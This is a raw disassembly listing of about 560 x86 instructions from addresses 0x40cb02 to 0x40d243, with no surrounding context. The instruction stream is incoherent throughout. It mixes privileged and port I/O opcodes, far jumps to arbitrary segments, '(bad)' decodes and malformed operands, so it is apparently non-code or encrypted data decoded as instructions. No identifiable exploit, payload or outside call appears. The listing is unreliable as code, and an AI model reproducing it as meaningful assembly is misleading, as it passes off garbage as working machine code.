  40cb02:	outs   dx,DWORD PTR ds:[esi]
  40cb03:	aas    
  40cb04:	nop
  40cb05:	mov    esi,0xfc4fea79
  40cb0a:	idiv   ebx
  40cb0c:	and    al,0xa5
  40cb0e:	in     eax,0x67
  40cb10:	jecxz  0x40caa9
  40cb12:	push   ebp
  40cb13:	pop    ebp
  40cb14:	les    edx,FWORD PTR [eax-0x73]
  40cb17:	xchg   edx,ebx
  40cb19:	mov    ch,0x95
  40cb1b:	pop    eax
  40cb1c:	mov    esi,0xf13c470b
  40cb21:	icebp  
  40cb22:	jmp    0xd264:0xc344fb40
  40cb29:	mov    ebp,0x77f618d
  40cb2e:	cwde   
  40cb2f:	fbld   TBYTE PTR [edi+0x67]
  40cb32:	loopne 0x40cadb
  40cb34:	cmp    eax,0xbfd7538c
  40cb39:	outs   dx,DWORD PTR ds:[esi]
  40cb3a:	inc    ebx
  40cb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb3c:	mov    ecx,0xb194b055
  40cb41:	test   BYTE PTR [ebp+eiz*1+0x120eba62],dl
  40cb48:	push   0xffffff9d
  40cb4a:	out    0xe8,al
  40cb4c:	xchg   esi,eax
  40cb4d:	and    DWORD PTR [ebx-0x2baefd48],edx
  40cb53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb54:	and    DWORD PTR [ecx],ebx
  40cb56:	add    BYTE PTR [edx],al
  40cb58:	push   ebx
  40cb59:	xor    BYTE PTR [ebx+esi*1-0x3db8c50d],al
  40cb60:	xchg   ebx,esi
  40cb62:	shr    DWORD PTR [edi+0xf],1
  40cb65:	jp     0x40cb5c
  40cb67:	xor    ch,BYTE PTR [ebx]
  40cb69:	dec    DWORD PTR [edx+0xc]
  40cb6c:	fmul   DWORD PTR [eax]
  40cb6e:	jl     0x40cb93
  40cb70:	clc    
  40cb71:	out    0x4a,al
  40cb73:	cmp    al,0x1d
  40cb75:	push   ebp
  40cb76:	dec    esp
  40cb77:	es or  al,0x8b
  40cb7a:	cld    
  40cb7b:	sub    al,0xf8
  40cb7d:	ret    0x47b
  40cb80:	loopne 0x40cb90
  40cb82:	add    al,0xd5
  40cb84:	test   DWORD PTR [edx-0x4a],esp
  40cb87:	and    eax,0xac3f2932
  40cb8c:	fcmovnu st,st(0)
  40cb8e:	fwait
  40cb8f:	pop    eax
  40cb90:	cli    
  40cb91:	dec    esi
  40cb92:	mov    ds,WORD PTR [ebp-0x4a1b5fad]
  40cb98:	neg    BYTE PTR [esi+ecx*1-0x11d42b16]
  40cb9f:	jae    0x40cb48
  40cba1:	sti    
  40cba2:	mov    al,ds:0xde17cd7f
  40cba7:	nop
  40cba8:	mov    eax,DWORD PTR fs:[ebp-0xd32f76e]
  40cbaf:	cli    
  40cbb0:	iret   
  40cbb1:	test   DWORD PTR [edx],esi
  40cbb3:	cmp    cl,BYTE PTR [edi+0x51046bd4]
  40cbb9:	mov    ds:0xecfaa060,al
  40cbbe:	lods   eax,DWORD PTR ds:[si]
  40cbc0:	int    0x1c
  40cbc2:	iret   
  40cbc3:	pop    ss
  40cbc4:	lock sbb al,0xe6
  40cbc7:	adc    DWORD PTR [edx],ebx
  40cbc9:	pop    es
  40cbca:	sar    ch,1
  40cbcc:	mov    ds:0xe853979b,al
  40cbd1:	mov    esi,0x71a349d7
  40cbd6:	sbb    BYTE PTR [edi+0x48],ah
  40cbd9:	repnz addr16 aas 
  40cbdc:	mov    edi,0x2edec4b8
  40cbe1:	or     ecx,DWORD PTR ds:0x994af77d
  40cbe7:	inc    ebp
  40cbe8:	cmp    eax,ecx
  40cbea:	jg     0x40cc3a
  40cbec:	adc    ebx,DWORD PTR ds:0xa452d446
  40cbf2:	dec    eax
  40cbf3:	push   ss
  40cbf4:	jmp    0x48161940
  40cbf9:	or     DWORD PTR [ecx],eax
  40cbfb:	bnd jbe 0x40cc69
  40cbfe:	mov    ch,0x44
  40cc00:	cmc    
  40cc01:	cmp    DWORD PTR [eax+ebp*8],edx
  40cc04:	xor    bl,BYTE PTR [edi-0x5a]
  40cc07:	setl   BYTE PTR [ecx-0x1b44110a]
  40cc0e:	xchg   edx,eax
  40cc0f:	icebp  
  40cc10:	retf   0x2642
  40cc13:	push   esp
  40cc14:	cmp    bl,BYTE PTR [eax+esi*2-0x6]
  40cc18:	popf   
  40cc19:	scas   eax,DWORD PTR es:[edi]
  40cc1a:	out    0xfa,eax
  40cc1c:	jg     0x40cbf5
  40cc1e:	lahf   
  40cc1f:	sti    
  40cc20:	iret   
  40cc21:	outs   dx,DWORD PTR ds:[esi]
  40cc22:	jle    0x40cbae
  40cc24:	xchg   esi,eax
  40cc25:	sti    
  40cc26:	dec    esi
  40cc27:	dec    esp
  40cc28:	sbb    DWORD PTR [ebx*1+0x6e2ade61],0xdf13cb6e
  40cc33:	pop    eax
  40cc34:	cwde   
  40cc35:	aam    0x7f
  40cc37:	mov    bl,0xe4
  40cc39:	sub    BYTE PTR [eax],ch
  40cc3b:	retf   0xb3e1
  40cc3e:	stos   DWORD PTR es:[edi],eax
  40cc3f:	push   edi
  40cc40:	cmp    edi,esi
  40cc42:	sti    
  40cc43:	pusha  
  40cc44:	pop    ebp
  40cc45:	mov    esp,0x44fea32f
  40cc4a:	adc    ebx,DWORD PTR [edi]
  40cc4c:	adc    al,dh
  40cc4e:	or     DWORD PTR [esi],esi
  40cc50:	fistp  WORD PTR [ebp+0x5b7bbb8e]
  40cc56:	lods   eax,DWORD PTR ds:[esi]
  40cc57:	loopne 0x40cc9d
  40cc59:	push   0xffffff89
  40cc5b:	mov    ah,0xa6
  40cc5d:	sbb    DWORD PTR [edx],esp
  40cc5f:	fs push 0xcd16af83
  40cc65:	or     al,0xd4
  40cc67:	adc    al,0xc8
  40cc69:	xchg   esi,eax
  40cc6a:	mov    al,ds:0xea23e7cb
  40cc6f:	nop
  40cc70:	or     bh,BYTE PTR [eax-0x4a367a37]
  40cc76:	dec    ebp
  40cc77:	shr    BYTE PTR [edx+ecx*2],1
  40cc7a:	add    eax,0x63e4e5c0
  40cc7f:	clc    
  40cc80:	sbb    esp,DWORD PTR [ebx]
  40cc82:	cli    
  40cc83:	xor    esp,esi
  40cc85:	xchg   BYTE PTR [ebx-0x2a9d3b58],ah
  40cc8b:	dec    ecx
  40cc8c:	dec    esp
  40cc8d:	pop    ss
  40cc8e:	and    esp,ebp
  40cc90:	dec    ebp
  40cc91:	icebp  
  40cc92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc93:	mov    bl,0x92
  40cc95:	push   ebp
  40cc96:	jb     0x40cc4f
  40cc98:	ret    0x5faa
  40cc9b:	pushf  
  40cc9c:	mov    BYTE PTR [ebx+0x50],bl
  40cc9f:	call   0xa6881a45
  40cca4:	adc    al,0xb7
  40cca6:	es int3 
  40cca8:	xlat   BYTE PTR ds:[ebx]
  40cca9:	daa    
  40ccaa:	iret   
  40ccab:	dec    edi
  40ccac:	cwde   
  40ccad:	xor    eax,0x75b6d6d0
  40ccb2:	aas    
  40ccb3:	js     0x40cc80
  40ccb5:	push   ecx
  40ccb6:	jg     0x40cd2d
  40ccb8:	push   ebx
  40ccb9:	outs   dx,DWORD PTR ds:[esi]
  40ccba:	xchg   ebp,eax
  40ccbb:	leave  
  40ccbc:	(bad)  
  40ccbd:	fwait
  40ccbe:	stc    
  40ccbf:	cmp    al,0xa
  40ccc1:	les    esp,FWORD PTR [ebp+0x2c]
  40ccc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccc5:	adc    ebp,DWORD PTR [edx-0x3fb1e757]
  40cccb:	aaa    
  40cccc:	xchg   edx,eax
  40cccd:	inc    ecx
  40ccce:	jno    0x40cca1
  40ccd0:	ja     0x40cc61
  40ccd2:	stc    
  40ccd3:	cmp    al,0xeb
  40ccd5:	pop    edi
  40ccd6:	mov    ebp,0x4b267ac8
  40ccdb:	pop    esp
  40ccdc:	adc    BYTE PTR es:[ebp-0x5b],dh
  40cce0:	ror    dh,cl
  40cce2:	icebp  
  40cce3:	scas   eax,DWORD PTR es:[edi]
  40cce4:	cmp    al,0x93
  40cce6:	nop
  40cce7:	xchg   BYTE PTR [ecx+0x5f4581af],ah
  40cced:	ret    
  40ccee:	adc    ecx,DWORD PTR ds:0x5f9a21cc
  40ccf4:	in     eax,dx
  40ccf5:	test   dl,ah
  40ccf7:	sub    al,0xa5
  40ccf9:	fwait
  40ccfa:	add    esi,DWORD PTR [esi]
  40ccfc:	xchg   esp,eax
  40ccfd:	shl    DWORD PTR [eax+0x1c],1
  40cd00:	or     eax,0x1e16001a
  40cd05:	inc    esp
  40cd06:	pop    edx
  40cd07:	retf   
  40cd08:	test   DWORD PTR [eax+0x3],ebx
  40cd0b:	pop    esp
  40cd0c:	mov    WORD PTR [ebp+0x65],es
  40cd0f:	scas   al,BYTE PTR es:[edi]
  40cd10:	stc    
  40cd11:	shl    bl,cl
  40cd13:	enter  0x3224,0x9d
  40cd17:	sub    al,0x3
  40cd19:	pop    edi
  40cd1a:	(bad)  
  40cd1b:	(bad)  
  40cd1d:	mov    edx,DWORD PTR [ecx+0x3846e24d]
  40cd23:	loop   0x40cd69
  40cd25:	imul   esi,DWORD PTR [edx-0x2de27882],0x20
  40cd2c:	gs push esp
  40cd2e:	data16 xchg BYTE PTR [eax-0x34e85e44],cl
  40cd35:	sbb    eax,0x2bedf0ee
  40cd3a:	mov    esi,0x15ba3bbe
  40cd3f:	jbe    0x40cd69
  40cd41:	leave  
  40cd42:	mov    eax,0xbe49e532
  40cd47:	in     eax,dx
  40cd48:	stc    
  40cd49:	inc    eax
  40cd4a:	aaa    
  40cd4b:	push   es
  40cd4c:	xor    al,0x59
  40cd4e:	rcl    BYTE PTR [ecx+0x33],cl
  40cd51:	in     al,dx
  40cd52:	mov    ebp,0xab02ccff
  40cd57:	bound  ebp,QWORD PTR [eax+0x132fd844]
  40cd5d:	addr16 mov eax,0x59e3e242
  40cd63:	loope  0x40cd1d
  40cd65:	lods   ax,WORD PTR ds:[esi]
  40cd67:	sbb    bl,BYTE PTR [ecx+0xe52e261]
  40cd6d:	frstor [ebx-0x751a4bb3]
  40cd73:	jb     0x40cd4b
  40cd75:	fwait
  40cd76:	xor    eax,0xf121a4da
  40cd7b:	and    BYTE PTR [ecx],ah
  40cd7d:	fcom   QWORD PTR [esi-0x87c4be7]
  40cd83:	les    edi,FWORD PTR [ecx+edx*4]
  40cd86:	add    esi,ebx
  40cd88:	clc    
  40cd89:	pop    eax
  40cd8a:	out    0x67,eax
  40cd8c:	inc    ebp
  40cd8d:	fwait
  40cd8e:	dec    ebx
  40cd8f:	jo     0x40cdc4
  40cd91:	pop    ecx
  40cd92:	aas    
  40cd93:	dec    edi
  40cd94:	inc    edi
  40cd95:	sbb    eax,0x53c425b6
  40cd9a:	push   es
  40cd9b:	jg     0x40cdae
  40cd9d:	cmp    al,0xc8
  40cd9f:	imul   ebx,DWORD PTR [eax+0x71],0xd21a5e6b
  40cda6:	push   0xea642f6b
  40cdab:	loope  0x40cd9a
  40cdad:	or     eax,0x2c3b46aa
  40cdb2:	pop    esi
  40cdb3:	js     0x40cd67
  40cdb5:	cwde   
  40cdb6:	inc    eax
  40cdb7:	into   
  40cdb8:	inc    esi
  40cdb9:	adc    edi,DWORD PTR [eax]
  40cdbb:	dec    ebx
  40cdbc:	mov    ah,0x58
  40cdbe:	push   ebp
  40cdbf:	scas   al,BYTE PTR es:[edi]
  40cdc0:	mov    ecx,0x3d557e8d
  40cdc5:	xor    al,0xdf
  40cdc7:	adc    esi,DWORD PTR [ebx]
  40cdc9:	pusha  
  40cdca:	pop    edx
  40cdcb:	hlt    
  40cdcc:	xor    bl,BYTE PTR [ecx-0x67]
  40cdcf:	shl    BYTE PTR [esp+edi*8-0x25],1
  40cdd3:	mov    esi,0xd74ed915
  40cdd8:	outs   dx,BYTE PTR ds:[esi]
  40cdd9:	jle    0x40cd82
  40cddb:	test   al,0x1c
  40cddd:	jno    0x40cdf5
  40cddf:	ins    DWORD PTR es:[edi],dx
  40cde0:	xchg   esi,eax
  40cde1:	sbb    BYTE PTR [edx-0x2e],0x31
  40cde5:	lods   al,BYTE PTR ds:[esi]
  40cde6:	jmp    0xd87d:0x443c1def
  40cded:	fsub   DWORD PTR [eax+edx*4]
  40cdf0:	stos   DWORD PTR es:[edi],eax
  40cdf1:	aam    0xeb
  40cdf3:	js     0x40cd9d
  40cdf5:	cmp    DWORD PTR [edi+0x623da211],eax
  40cdfb:	popa   
  40cdfc:	jno    0x40ce67
  40cdfe:	mov    esi,DWORD PTR [ebx+0x3dec3f]
  40ce04:	sub    BYTE PTR [ecx+0x2e4ad4f8],ch
  40ce0a:	lods   al,BYTE PTR ss:[esi]
  40ce0c:	mov    eax,ds:0xff0fe5b
  40ce11:	pop    edi
  40ce12:	into   
  40ce13:	je     0x40ce6f
  40ce15:	mov    edi,0xd542b976
  40ce1a:	mov    dh,0x73
  40ce1c:	in     al,0xe4
  40ce1e:	sar    DWORD PTR [ebp+0x15],cl
  40ce21:	fcom   st(3)
  40ce23:	outs   dx,DWORD PTR ds:[esi]
  40ce24:	(bad)  
  40ce25:	push   ds
  40ce26:	push   ss
  40ce27:	cdq    
  40ce28:	addr16 repz ss mov esi,ecx
  40ce2d:	retf   
  40ce2e:	ret    0x5293
  40ce31:	pop    ecx
  40ce32:	pusha  
  40ce33:	sub    edx,ebp
  40ce35:	in     eax,0x26
  40ce37:	in     eax,0x9b
  40ce39:	xchg   BYTE PTR [esi],cl
  40ce3b:	inc    edx
  40ce3c:	dec    esi
  40ce3d:	cli    
  40ce3e:	sar    ebx,cl
  40ce40:	inc    edx
  40ce41:	enter  0x5eea,0x5e
  40ce45:	push   esp
  40ce46:	cmp    BYTE PTR [edi-0x706c3a6c],dl
  40ce4c:	imul   bl
  40ce4e:	xchg   esi,eax
  40ce4f:	inc    ebx
  40ce50:	das    
  40ce51:	xchg   ecx,eax
  40ce52:	fnstcw WORD PTR [ecx]
  40ce54:	and    al,0xc4
  40ce56:	xchg   edi,eax
  40ce57:	adc    edi,DWORD PTR [edx-0x7f]
  40ce5a:	stos   BYTE PTR es:[edi],al
  40ce5b:	call   0x8b17620b
  40ce60:	repnz sbb DWORD PTR [esi],edx
  40ce63:	dec    eax
  40ce64:	pop    esi
  40ce65:	iret   
  40ce66:	inc    esi
  40ce67:	sbb    BYTE PTR [ecx+esi*4+0x66],bh
  40ce6b:	jp     0x40ceea
  40ce6d:	daa    
  40ce6e:	mov    eax,ds:0xb77e82c1
  40ce73:	idiv   BYTE PTR [ebp-0x6]
  40ce76:	cmp    DWORD PTR [edx],0xfffffffc
  40ce79:	pop    ebx
  40ce7a:	ins    BYTE PTR es:[edi],dx
  40ce7b:	rcr    BYTE PTR [eax-0x39],1
  40ce7e:	inc    edx
  40ce7f:	pop    ds
  40ce80:	rol    DWORD PTR [edx+0x39],cl
  40ce83:	outs   dx,BYTE PTR ds:[esi]
  40ce84:	sbb    eax,0x2160632f
  40ce89:	popa   
  40ce8a:	into   
  40ce8b:	push   eax
  40ce8c:	fsub   QWORD PTR ds:0xece20894
  40ce92:	out    0x5c,al
  40ce94:	pop    esi
  40ce95:	fndisi(8087 only) 
  40ce97:	ja     0x40cf0f
  40ce99:	dec    ebp
  40ce9a:	mov    esp,0x80196156
  40ce9f:	(bad)
  40cea2:	fcmove st,st(0)
  40cea4:	inc    edi
  40cea5:	mov    edx,0x539a9c5e
  40ceaa:	add    ebx,DWORD PTR [esp+eax*2]
  40cead:	mov    ?,WORD PTR [edi-0x70a14623]
  40ceb3:	inc    ebx
  40ceb4:	dec    eax
  40ceb5:	stos   DWORD PTR es:[edi],eax
  40ceb6:	mov    al,0xb1
  40ceb8:	xor    eax,DWORD PTR [esi]
  40ceba:	jne    0x40cef6
  40cebc:	pop    es
  40cebd:	pushf  
  40cebe:	scas   eax,DWORD PTR es:[edi]
  40cebf:	xor    ah,BYTE PTR [esi+ecx*4-0x53]
  40cec3:	xor    al,0x66
  40cec5:	clc    
  40cec6:	das    
  40cec7:	int3   
  40cec8:	rcl    BYTE PTR [ecx-0x4e],cl
  40cecb:	popa   
  40cecc:	xor    al,0x6
  40cece:	or     dl,BYTE PTR [edx-0x164cd4f3]
  40ced4:	sub    eax,0x5c5e1d4b
  40ced9:	je     0x40cf57
  40cedb:	(bad)  
  40cedc:	lods   eax,DWORD PTR ds:[esi]
  40cedd:	out    0x7a,eax
  40cedf:	ret    0x6ef1
  40cee2:	jb     0x40ce86
  40cee4:	mov    al,0x97
  40cee6:	test   al,0xe0
  40cee8:	ja     0x40ce8f
  40ceea:	clc    
  40ceeb:	cmp    DWORD PTR [ecx+edi*4+0x6b],esi
  40ceef:	adc    eax,0x56753c59
  40cef4:	jns    0x40ceef
  40cef6:	cs stos DWORD PTR es:[edi],eax
  40cef8:	pop    ds
  40cef9:	shl    dl,0x35
  40cefc:	mov    bh,0x44
  40cefe:	mov    esp,0x70d75e5e
  40cf03:	cmp    ebp,eax
  40cf05:	pop    ebx
  40cf06:	adc    esp,esi
  40cf08:	retf   
  40cf09:	jp     0x40cf5e
  40cf0b:	or     DWORD PTR [ebp+0x6b],ecx
  40cf0e:	jo     0x40cf1a
  40cf10:	push   edi
  40cf11:	fcmovnu st,st(0)
  40cf13:	fcom   QWORD PTR [ebp-0x4e]
  40cf16:	adc    cl,BYTE PTR [edx+0x72]
  40cf19:	or     eax,0xdf823b5c
  40cf1e:	mov    bl,0xcc
  40cf20:	dec    esi
  40cf21:	or     DWORD PTR [ecx],ecx
  40cf23:	rcl    edx,cl
  40cf25:	int3   
  40cf26:	out    0x2c,al
  40cf28:	imul   edx,DWORD PTR [esi+eiz*1+0x4de0c6ff],0xc7e14fa4
  40cf33:	mov    ?,esi
  40cf35:	xchg   esp,eax
  40cf36:	sub    al,0xc6
  40cf38:	std    
  40cf39:	sub    esi,esi
  40cf3b:	(bad)  
  40cf3d:	outs   dx,BYTE PTR ds:[esi]
  40cf3e:	add    al,0x38
  40cf40:	loopne 0x40cf7f
  40cf42:	repnz cli 
  40cf44:	std    
  40cf45:	fimul  WORD PTR [edx+0x5a9efb3]
  40cf4b:	ins    BYTE PTR es:[edi],dx
  40cf4c:	call   0x5850acc7
  40cf51:	sbb    BYTE PTR [ebp-0x71bce824],cl
  40cf57:	enter  0x5aff,0x8f
  40cf5b:	mov    bh,0x3c
  40cf5d:	pop    ds
  40cf5e:	cmp    BYTE PTR [eiz*2+0x30cbb992],0x48
  40cf66:	sar    BYTE PTR [esi+0x3f816820],cl
  40cf6c:	ret    
  40cf6d:	mov    al,ds:0xc96c6993
  40cf72:	(bad)  
  40cf73:	test   eax,0x48ba5141
  40cf78:	inc    ecx
  40cf79:	jae    0x40cff7
  40cf7b:	jle    0x40cf6f
  40cf7d:	(bad)  
  40cf7e:	mov    ebx,0x7b7a8db
  40cf83:	push   ebp
  40cf84:	sahf   
  40cf85:	leave  
  40cf86:	push   0x5eab0bef
  40cf8b:	push   esi
  40cf8c:	mov    edi,0xd38a783f
  40cf91:	mov    esi,0x71e71bb9
  40cf96:	cld    
  40cf97:	rol    BYTE PTR [edi-0x3bbdeac3],1
  40cf9d:	fidivr DWORD PTR [eax]
  40cf9f:	sti    
  40cfa0:	adc    al,0x31
  40cfa2:	fisub  WORD PTR [ebx]
  40cfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa5:	adc    eax,0xd7877126
  40cfaa:	mov    ?,WORD PTR ds:[ebp+0x3c726dc1]
  40cfb1:	sbb    al,BYTE PTR [ebp+0x17a2a1a6]
  40cfb7:	into   
  40cfb8:	(bad)  
  40cfb9:	leave  
  40cfba:	cld    
  40cfbb:	or     ch,BYTE PTR [edi-0x35]
  40cfbe:	test   al,0xaf
  40cfc0:	ds dec esp
  40cfc2:	in     al,0x1d
  40cfc4:	pop    edx
  40cfc5:	das    
  40cfc6:	mov    esp,0xf98f7bfd
  40cfcb:	iret   
  40cfcc:	jg     0x40cffa
  40cfce:	adc    eax,0xaa725055
  40cfd3:	push   DWORD PTR [ecx+0x59]
  40cfd6:	sbb    al,0x3b
  40cfd8:	adc    cl,al
  40cfda:	add    ebp,eax
  40cfdc:	cmp    dl,BYTE PTR gs:[ebp-0x1b]
  40cfe0:	je     0x40cf82
  40cfe2:	xchg   edx,eax
  40cfe3:	dec    edi
  40cfe4:	xchg   ecx,eax
  40cfe5:	out    dx,eax
  40cfe6:	push   0x7061cb1
  40cfeb:	stos   DWORD PTR es:[edi],eax
  40cfec:	es mov al,0xf6
  40cfef:	mov    WORD PTR [edi],ds
  40cff1:	fmul   DWORD PTR [ebx+eiz*1+0x4d]
  40cff5:	jnp    0x40d050
  40cff7:	fstp   TBYTE PTR gs:[ecx+0x2c]
  40cffb:	push   esi
  40cffc:	mov    ds:0xbceac4b4,eax
  40d001:	(bad)  [esp+ebx*2]
  40d004:	in     eax,dx
  40d005:	mov    al,ds:0xf01b345e
  40d00a:	jno    0x40cfab
  40d00c:	ja     0x40d05b
  40d00e:	stc    
  40d00f:	mov    al,ds:0xd38a4a6f
  40d014:	cmp    al,0x68
  40d016:	call   0x182c:0x68c212ae
  40d01d:	mov    esp,0x2f8a2f76
  40d022:	int    0xaa
  40d024:	pop    ebx
  40d025:	out    0xc4,al
  40d027:	icebp  
  40d028:	xchg   esp,eax
  40d029:	dec    eax
  40d02a:	mov    ds:0x87719aed,al
  40d02f:	adc    eax,0x8fc9ceeb
  40d034:	sub    bh,BYTE PTR [ebx]
  40d036:	ja     0x40d0a3
  40d038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d039:	ins    BYTE PTR es:[edi],dx
  40d03a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40d03c:	xor    ebx,ebp
  40d03e:	sub    al,0xe8
  40d040:	scas   al,BYTE PTR es:[edi]
  40d041:	les    eax,FWORD PTR [edx+0x18]
  40d044:	push   ecx
  40d045:	xor    eax,0x2496045e
  40d04a:	push   edi
  40d04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d04c:	push   es
  40d04d:	jnp    0x40d078
  40d04f:	repz add DWORD PTR [ebp-0x1b],esi
  40d053:	mov    ch,0x86
  40d055:	lods   eax,DWORD PTR ds:[esi]
  40d056:	test   DWORD PTR [edi-0x232905a1],edx
  40d05c:	idiv   BYTE PTR [ebp+0x23]
  40d05f:	sbb    al,0x2d
  40d061:	sub    DWORD PTR [esi],esi
  40d063:	les    eax,FWORD PTR [ebp+0x4599aa93]
  40d069:	push   esp
  40d06a:	(bad)  
  40d06b:	das    
  40d06c:	sar    BYTE PTR [esi-0x3dce5ea9],1
  40d072:	and    eax,0xbe93ce3f
  40d077:	(bad)  ds:0x5047f72f
  40d07d:	pop    edi
  40d07e:	jl     0x40d0e4
  40d080:	mov    ebp,0x3e81164d
  40d085:	mov    bl,BYTE PTR [edx*4+0x2b01c789]
  40d08c:	mov    al,ds:0xe512f47d
  40d091:	push   es
  40d092:	inc    eax
  40d093:	jbe    0x40d0c6
  40d095:	and    eax,0x968f4257
  40d09a:	mov    eax,ds:0x58c2b774
  40d09f:	(bad)  
  40d0a0:	ror    esi,cl
  40d0a2:	call   0xe66e47c5
  40d0a7:	imul   edi,DWORD PTR [ebx+0x7],0xffffffc4
  40d0ab:	stc    
  40d0ac:	sbb    DWORD PTR [edi+0x62cc19d5],edi
  40d0b2:	shl    bh,1
  40d0b4:	ret    
  40d0b5:	mul    esi
  40d0b7:	push   esp
  40d0b8:	jg     0x40d104
  40d0ba:	xchg   esi,ebx
  40d0bc:	mov    fs,WORD PTR [ebx*8-0x416924d8]
  40d0c3:	and    BYTE PTR [esi+0x36],dh
  40d0c6:	jl     0x40d0c9
  40d0c8:	repz (bad) 
  40d0ca:	jbe    0x40d06d
  40d0cc:	jbe    0x40d056
  40d0ce:	popf   
  40d0cf:	dec    esp
  40d0d0:	cmp    eax,0x43dc2b3f
  40d0d5:	scas   eax,DWORD PTR es:[edi]
  40d0d6:	gs out dx,al
  40d0d8:	ss (bad) 
  40d0da:	mul    BYTE PTR [ecx]
  40d0dc:	pop    esp
  40d0dd:	out    dx,eax
  40d0de:	repz js 0x40d146
  40d0e1:	xchg   edi,eax
  40d0e2:	sub    eax,0x97ebda39
  40d0e7:	xor    ch,ch
  40d0e9:	leave  
  40d0ea:	lock push 0xfffffff2
  40d0ed:	inc    ebx
  40d0ee:	jo     0x40d08d
  40d0f0:	add    ah,dl
  40d0f2:	mov    ecx,0xd6c56647
  40d0f7:	lods   al,BYTE PTR ds:[esi]
  40d0f8:	jecxz  0x40d139
  40d0fa:	ret    
  40d0fb:	and    ebp,DWORD PTR [ebx-0x13]
  40d0fe:	inc    edx
  40d0ff:	clc    
  40d100:	inc    ecx
  40d101:	aaa    
  40d102:	pop    edx
  40d103:	stc    
  40d104:	add    BYTE PTR [ebx],al
  40d106:	test   eax,0x510a68ff
  40d10b:	jo     0x40d127
  40d10d:	sbb    al,0x99
  40d10f:	fmul   QWORD PTR [esi-0x45]
  40d112:	and    edx,DWORD PTR [ebp-0x1aae96a7]
  40d118:	cmp    al,BYTE PTR [ecx-0x23]
  40d11b:	out    0xb9,al
  40d11d:	xlat   BYTE PTR ds:[ebx]
  40d11e:	inc    eax
  40d11f:	sub    ebp,DWORD PTR [edi]
  40d121:	push   ecx
  40d122:	jl     0x40d0fd
  40d124:	dec    eax
  40d125:	jnp    0x40d0b2
  40d127:	out    dx,eax
  40d128:	jge    0x40d0e6
  40d12a:	ins    BYTE PTR es:[edi],dx
  40d12b:	mov    dl,0x7
  40d12d:	aas    
  40d12e:	inc    edx
  40d12f:	push   0x34
  40d131:	stc    
  40d132:	or     ch,al
  40d134:	stc    
  40d135:	out    dx,al
  40d136:	or     al,0x8e
  40d138:	jl     0x40d118
  40d13a:	jnp    0x40d189
  40d13c:	test   al,0xa7
  40d13e:	cmc    
  40d13f:	pop    ecx
  40d140:	dec    eax
  40d141:	jmp    0xbf44645
  40d146:	rcr    dl,cl
  40d148:	not    DWORD PTR ds:0x2763740
  40d14e:	cwde   
  40d14f:	repz pusha 
  40d151:	xor    eax,0xc6f0e751
  40d156:	add    ch,0x1b
  40d159:	mov    ah,0x17
  40d15b:	hlt    
  40d15c:	arpl   ax,si
  40d15e:	ret    0xb240
  40d161:	clc    
  40d162:	xchg   ecx,eax
  40d163:	adc    esp,DWORD PTR [edi]
  40d165:	stc    
  40d166:	jmp    0x40d1b0
  40d168:	fidiv  WORD PTR [ebx]
  40d16a:	pop    ecx
  40d16b:	or     esp,DWORD PTR [ebp-0x6a]
  40d16e:	(bad)
  40d171:	cmp    eax,0xca9352a1
  40d176:	push   ebp
  40d177:	(bad)  
  40d178:	std    
  40d179:	data16 (bad) 
  40d17d:	test   BYTE PTR [edi+edi*1],dh
  40d180:	dec    edx
  40d181:	mov    ds:0x30952837,eax
  40d186:	and    ecx,ecx
  40d188:	ss or  eax,0x2d867968
  40d18e:	xor    al,BYTE PTR ds:0x2e3d6749
  40d194:	test   eax,0xbd8e62bb
  40d199:	ins    DWORD PTR es:[edi],dx
  40d19a:	or     DWORD PTR [ebp+0x77f72fc5],esi
  40d1a0:	mov    al,ds:0x82bfe6cf
  40d1a5:	cmp    bh,bh
  40d1a7:	fistp  WORD PTR [ecx-0x4684d553]
  40d1ad:	xor    ebp,edx
  40d1af:	push   eax
  40d1b0:	fisub  WORD PTR [ecx]
  40d1b2:	fwait
  40d1b3:	out    dx,eax
  40d1b4:	mov    ah,0xf
  40d1b6:	mov    ah,0xfa
  40d1b8:	jnp    0x40d1d2
  40d1ba:	outs   dx,DWORD PTR ds:[esi]
  40d1bb:	add    esp,ebp
  40d1bd:	jl     0x40d23a
  40d1bf:	ret    0x490f
  40d1c2:	push   es
  40d1c3:	push   esi
  40d1c4:	adc    DWORD PTR [ebx+0x612ab97a],eax
  40d1ca:	aaa    
  40d1cb:	jle    0x40d175
  40d1cd:	stc    
  40d1ce:	retf   0xb570
  40d1d1:	inc    ecx
  40d1d2:	adc    DWORD PTR [ebx-0x2214f996],ebx
  40d1d8:	dec    esp
  40d1d9:	adc    eax,0xe5bb5d5e
  40d1de:	cmp    al,0x14
  40d1e0:	mov    al,ds:0xfe35fbb8
  40d1e5:	jmp    0x40d1b9
  40d1e7:	and    al,0x0
  40d1e9:	call   0x57a03d74
  40d1ee:	and    bl,0x80
  40d1f1:	ins    DWORD PTR es:[edi],dx
  40d1f2:	jp     0x40d202
  40d1f4:	pop    esp
  40d1f5:	fmul   QWORD PTR [ecx+0x5ffed55]
  40d1fb:	nop
  40d1fc:	mov    BYTE PTR [ebx-0x2e],bh
  40d1ff:	lods   al,BYTE PTR ds:[esi]
  40d200:	aas    
  40d201:	shl    DWORD PTR [ebp+0x6049fbd2],1
  40d207:	mov    bh,0x45
  40d209:	retf   0xea13
  40d20c:	cmp    edi,esp
  40d20e:	in     eax,dx
  40d20f:	js     0x40d22c
  40d211:	and    ebp,DWORD PTR [ebx+0x4832cc34]
  40d217:	dec    edi
  40d218:	popf   
  40d219:	mov    eax,ds:0xc2b1ee
  40d21e:	test   DWORD PTR [ebp-0x119a6b97],ecx
  40d224:	repz fisub DWORD PTR ss:[edx-0x592f0636]
  40d22c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22d:	mov    esi,0x4e26e7f
  40d232:	and    BYTE PTR [ebx+0x15924662],bh
  40d238:	sbb    al,0xa3
  40d23a:	mov    ebx,DWORD PTR [ebx+0x6c]
  40d23d:	addr16 sbb ah,dh
  40d240:	fwait
  40d241:	jmp    0x40d252
  40d243:	imul   esi,DWORD PTR [eax+ebx*8-0x3220e89a],0xe32e0f3e
